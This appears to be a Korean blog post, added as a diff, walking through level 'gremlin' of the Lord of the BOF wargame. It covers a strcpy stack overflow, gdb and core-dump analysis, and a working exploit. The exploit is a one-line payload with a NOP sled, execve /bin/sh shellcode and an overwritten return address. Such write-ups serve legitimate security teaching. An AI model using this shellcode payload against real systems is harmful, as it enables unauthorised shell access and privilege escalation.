@@ -1,0 +1,165 @@
+---
+layout: post
+title:  "[LOB]Level01. gremlin"
+subtitle:   "[LOB]gate → gremlin"
+categories: Wargame[LOB]
+tags:
+- Wargame
+- LOB
+- Write-up
+---
+## keyword : simple bof
+
+### 0x01. Static Analysis
+
+
+
+```c
+/*
+	The Lord of the BOF : The Fellowship of the BOF
+	- gremlin
+	- simple BOF
+*/
+int main(int argc, char *argv[])
+{
+    char buffer[256];
+    if(argc < 2){
+        printf("argv error\n");
+        exit(0);
+    }
+    strcpy(buffer, argv[1]);
+    printf("%s\n", buffer);
+}
+```
+
+제공되는 소스코드를 살펴보면 굉장히 단순한 프로그램이다.
+
+argv인자로 받은 값을 strcpy함수를 이용하여 buffer에 저장하는데, buffer의 크기는 256바이트이다.
+
+여기서 Buffer OverFlow 취약점이 존재한다.
+
+**buffer의 크기와 상관없이 strcpy로 값을 넣기 때문이다.**
+
+
+
+------
+
+
+
+### 0x02. Dynamic Analysis
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827153846747.png" width="400px">
+
+
+
+gdb로 gremlin 바이너리를 열어보면 buffer변수의 시작주소는 [ebp-256]이다.
+
+정확한 주소를 알기위해 main+53에 Break Point를 걸고 eax에 들어간 값을 살펴보자.
+
+> LOB에서 제공되는 바이너리에서는 gdb로 실행 불가능하므로 gremlin바이너리를 'aremlin'이라는 이름으로 복사하여 진행하였다. 파일이름의 길이가 실제 스택에 주소에 영향을 주므로 파일이름의 길이를 똑같이 맞춰주자.
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827160952522.png" width="400px">
+
+ebp-256의 주소는 0xbffffb88인 것으로 확인되었다.
+
+그리고 실제 strcpy함수가 실행되고 나서 해당 주소에 "AAAABBBBCCCC"가 들어가는지 확인해보자.
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827155432259.png" width="500px">
+
+정상적으로 값이 들어가는 것을 확인하였다.
+
+
+
+여기서 좀 더 확인하면 좋은 것이 있다. ==**현재 프로그램은 gdb라는 디버거 위에서 돌아가기 때문에, 여기서 구한 주소가 실제 스택에 같은 주소라는 보장은 없다.**== 때문에 실제 스택상에 올라가는 주소를 정확하게 구하기 위해서는 core 덤프를 확인하는 것이 좋다.
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827161306733.png" width="400px">
+
+`ulimit -a` 명령어로 core 생성 사이즈가 설정되어 있는지 확인하자. 만약 0으로 설정되어 있다면 `ulimit -c unlimited` 명령을 주어 설정하자.
+
+
+
+core덤프 크기가 설정되었으면 core 덤프를 생성해야 한다. core덤프는 프로그램이 동작하다가 예상치 못한 주소로 덤프하게 되어 프로그램이 죽어버릴 때, 그 순간의 스택 메모리를 저장한 것을 core덤프라고 한다.
+
+ret주소를 "CCCC"로 덮어 core덤프가 생성되도록 해보자.
+
+> LOB에서 제공한 'gremlin' 바이너리는 core덤프가 생성되지 않는 바이너리 이므로 앞서 만들어둔 'aremlin' 바이너리로 테스트하면 된다.
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827161634020.png" width="700px">
+
+
+
+buffer배열을 "A"로 채우고, SFP에는 "B"를 RET주소에는 "C"를 채우는 payload이다. 
+
+core덤프가 생성되었다고 하니 core덤프를 분석해보자.
+
+`gdb -q -c core` 명령어로 core덤프를 분석할 수 있다.
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827161824108.png" width="700px">
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827162010840.png" width="400px">
+
+예상한대로 ebp가 "BBBB"로 채워졌으며, EIP가 "CCCC"로 채워졌음을 확인 할 수 있다.
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827162123236.png" width="500px">
+
+프로그램이 종료된 스택 상태를 살펴보면 "A"라는 문자열이 0xbffffcf0 언저리에서 부터 들어간 것을 확인 할 수 있다.
+
+**우리가 buffer배열의 주소로 구한 0xbffffb88과는 확연히 다른 주소이다.**
+
+때문에 payload과정에서 시간을 절약하기 위해서 core덤프로 확실하게 확인하고 진행하는 것이 정신건강에 좋다.😁
+
+이제 우리의 ret주소는 0xbffffcf0으로 잡고 buffer 앞부분에 NOP코드를 넣어 NOP 슬라이딩하여 shellcode를 실행시키면 될 것 같다.👌
+
+
+
+------
+
+
+
+### 0x03. Exploit
+
+
+
+지금까지 얻은 정보들을 종합하여 RET주소를 변경하여 공격해보자.
+
+buffer의 크기는 256바이트이고, 그 뒤에 SFP가 4바이트 존재하고, RET주소가 있으므로 스택주고는 다음과 같다고 할 수 있다.
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827160200021.png" width="500px">
+
+
+
+buffer부분에 shellcode를 올려놓고 ret주소에 buffer주소를 넣으면 함수가 종료되면서 ret주소를 참조하여 해당 주소를 실행할 때, shellcode가 실행되게 된다.
+
+
+
+쉘을 실행시키는 shellcode는 다음과 같다.
+
+shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+
+
+#### Payload
+
+```sh
+./gremlin `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*(260-100-24)+"\xf0\xfc\xff\xbf"'`
+```
+
+ 
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827162535728.png" width="700px">
+
+
+
+**gremlin / hello bof world**
